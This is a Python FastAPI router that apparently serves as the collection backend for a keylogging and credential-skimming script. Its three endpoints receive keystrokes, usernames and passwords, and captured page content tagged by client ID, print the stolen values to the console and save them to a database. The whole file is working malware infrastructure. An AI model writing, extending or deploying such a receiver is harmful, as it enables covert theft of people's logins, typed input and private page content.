from fastapi import APIRouter
from ..schemas import KeySchema, LoginAttemptSchema, ContentSchema
from sqlalchemy import insert
from app.database import SessionLocal
from ..models import KeyModel, LoginAttemptModel, ContentModel
import requests.utils

router = APIRouter(prefix="/data", tags=["data"])


@router.post("/keys")
async def save_keys(key: KeySchema):
    with SessionLocal() as session:
        if key.key:
            print('Got keys pressed: ', requests.utils.unquote(key.key))
            stmt = insert(KeyModel).values(
                key=key.key,
                client_id=key.client_id
            )
            session.execute(stmt)
            session.commit()
    return key


@router.post("/login")
async def save_login(loginAttempt: LoginAttemptSchema):
    if len(loginAttempt.username) or len(loginAttempt.password):
        print(f'Got credentials: login: {requests.utils.unquote(loginAttempt.username)}, password: {requests.utils.unquote(loginAttempt.password)}, client_id: {loginAttempt.client_id}')
        with SessionLocal() as session:
            stmt = insert(LoginAttemptModel).values(
                username=loginAttempt.username,
                password=loginAttempt.password,
                client_id=loginAttempt.client_id
            )
            session.execute(stmt)
            session.commit()
    return loginAttempt


@router.post("/content")
async def save_content(content: ContentSchema):
    with SessionLocal() as session:
        print(f'Got internal content: url: {requests.utils.unquote(content.location)}, size: {len(content.content)}, client_id: {content.client_id}')
        stmt = insert(ContentModel).values(
            location=content.location,
            content=content.content,
            client_id=content.client_id
        )
        session.execute(stmt)
        session.commit()
    return content